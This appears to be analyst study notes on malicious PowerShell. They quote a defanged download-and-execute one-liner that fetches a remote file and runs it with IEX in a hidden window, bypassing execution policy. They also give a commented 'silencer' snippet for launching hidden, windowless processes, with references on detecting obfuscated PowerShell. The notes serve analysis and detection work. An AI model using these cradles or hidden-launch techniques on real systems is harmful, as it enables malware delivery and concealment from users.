```
 PowersheLl -windowstyle hidden -noexit -executionpolicy bypass -command IEX(New-Object Net.Webclient)DownloadString.Invoke(‘hxxp://ravigel[dot]com/1cr[dot]dat’)
```





## powershell Silencer
```
$s = New-Object System.Diagnostics.ProcessStartInfo;
$s.FileName = <FileName>;
$s.Arguments='-noni -nop -w hidden -c

$s.UseShellExecute=$false;
$s.RedirectStandardOutput=$true;
$s.WindowStyle='Hidden';
$s.CreateNoWindow=$true;
[System.Diagnostics.Process]::Start($s)
```
 - ```$s = New-Object System.Diagnostics.ProcessStartInfo``` creates PowerShell variable $s (defined as a new object, the object created is a new process) 
 - no profile 
 - ```-w hidden``` hidden window
 - ```$s.RedirectStandardOutput=$true;``` don’t keep track of standard output
 - ```$s.WindowStyle='Hidden';``` hide the window, 
 - ```$s.CreateNoWindow=$true;``` don’t create the window or invoke a new shell. 
 



# References:
- https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-7.2
- https://www.youtube.com/watch?v=P1lkflnWb0I
- https://www.leeholmes.com/more-detecting-obfuscated-powershell/
- https://www.huntress.com/blog/from-powershell-to-payload-an-analysis-of-weaponized-malware
- https://ss64.com/ps/
